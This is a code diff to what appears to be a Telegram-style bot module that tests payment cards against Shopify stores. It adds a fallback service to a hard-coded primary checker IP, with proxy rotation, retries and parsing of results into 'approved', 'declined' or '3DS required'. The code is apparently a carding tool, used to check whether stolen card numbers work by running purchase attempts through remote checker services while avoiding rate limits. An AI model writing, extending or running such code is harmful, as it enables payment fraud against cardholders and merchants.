@@ -3,6 +3,10 @@ import httpx
 import asyncio
 from BOT.tools.proxy import get_proxy
 
+# Primary and fallback API configuration
+PRIMARY_API = "http://69.62.117.8:8000/check"
+FALLBACK_API = "https://autoshopify.stormx.pw/index.php"
+
 def get_site(user_id):
     with open("DATA/sites.json", "r") as f:
         sites = json.load(f)
@@ -64,10 +68,26 @@ async def check_card(user_id, cc, site=None):
         return "Site Not Found"
 
     proxy = get_proxy(user_id)
+
+    # Try primary API first
+    result = await _try_primary_api(cc, site, proxy)
+
+    # If primary API fails or returns specific errors, try fallback API
+    if result in ["Connection Failed", "Product ID ⚠️", "IP Rate Limit", "Site | Card Error"] or "SERVER DISCONNECTED" in str(result):
+        print(f"Primary API failed with: {result}. Trying fallback API...")
+        fallback_result = await _try_fallback_api(cc, site, proxy)
+        if fallback_result and fallback_result != "Connection Failed":
+            return fallback_result
+
+    return result
+
+
+async def _try_primary_api(cc, site, proxy):
+    """Try the primary API endpoint"""
     if proxy:
-        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}&proxy={proxy}"
+        url = f"{PRIMARY_API}?card={cc}&site={site}&proxy={proxy}"
     else:
-        url = f"http://69.62.117.8:8000/check?card={cc}&site={site}"
+        url = f"{PRIMARY_API}?card={cc}&site={site}"
 
     retries = 0
     while retries < 3:
@@ -78,7 +98,6 @@ async def check_card(user_id, cc, site=None):
 
             if not any(x in data for x in ("CARD_DECLINED", "3DS_REQUIRED")):
                 print(data)
-
 
             response_text = data.get("Response", "").upper()
 
@@ -91,7 +110,12 @@ async def check_card(user_id, cc, site=None):
                 continue  # try again
             break  # if no disconnect error, break
 
-        except Exception:
+        except Exception as e:
+            print(f"Primary API exception: {e}")
+            retries += 1
+            if retries < 3:
+                await asyncio.sleep(2)
+                continue
             return "Connection Failed"
 
     if retries == 3:
@@ -115,3 +139,58 @@ async def check_card(user_id, cc, site=None):
         return "Site | Card Error"
     else:
         return response_text
+
+
+async def _try_fallback_api(cc, site, proxy):
+    """Try the fallback API endpoint"""
+    # Format the fallback API URL
+    params = {
+        "site": site,
+        "cc": cc
+    }
+
+    if proxy:
+        params["proxy"] = proxy
+
+    retries = 0
+    while retries < 3:
+        try:
+            async with httpx.AsyncClient(timeout=100.0, follow_redirects=True) as client:
+                response = await client.get(FALLBACK_API, params=params)
+                response_text = response.text.upper()
+
+                print(f"Fallback API response: {response_text[:200]}")
+
+                # Parse fallback API response
+                if any(word in response_text for word in ["APPROVED", "SUCCESS", "CHARGED", "CVV MATCH", "ORDER_PLACED", "THANK YOU"]):
+                    return "ORDER_PLACED"
+                elif "3D" in response_text or "3DS" in response_text:
+                    return "3DS_REQUIRED"
+                elif any(word in response_text for word in ["DECLINED", "INSUFFICIENT", "CARD DECLINED"]):
+                    return "CARD_DECLINED"
+                elif any(word in response_text for word in ["INCORRECT", "INVALID", "WRONG CVV"]):
+                    return "CARD_DECLINED"
+                elif "HANDLE IS EMPTY" in response_text:
+                    return "Product ID ⚠️"
+                elif "PROPOSAL STEP FAILED" in response_text:
+                    return "Site | Card Error"
+                else:
+                    # Return the raw response if no specific pattern matches
+                    return response_text[:200]
+
+        except httpx.TimeoutException:
+            print("Fallback API timeout")
+            retries += 1
+            if retries < 3:
+                await asyncio.sleep(2)
+                continue
+            return "Connection Failed"
+        except Exception as e:
+            print(f"Fallback API exception: {e}")
+            retries += 1
+            if retries < 3:
+                await asyncio.sleep(2)
+                continue
+            return "Connection Failed"
+
+    return "Connection Failed"
